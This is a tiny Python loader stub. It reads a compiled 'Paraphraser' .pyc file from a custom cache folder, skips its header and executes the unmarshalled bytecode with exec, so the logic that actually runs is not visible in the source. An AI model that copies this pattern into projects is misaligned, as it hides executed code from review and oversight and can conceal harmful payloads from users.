
import marshal
import os

s = open(os.path.join(os.path.dirname(os.path.realpath(__file__)), '__custom_pycache__', 'Paraphraser_a67a93fcfe1747f9acb22531c2850d40.cpython-xxx.pyc'), 'rb')
s.seek(16)
exec(marshal.load(s))
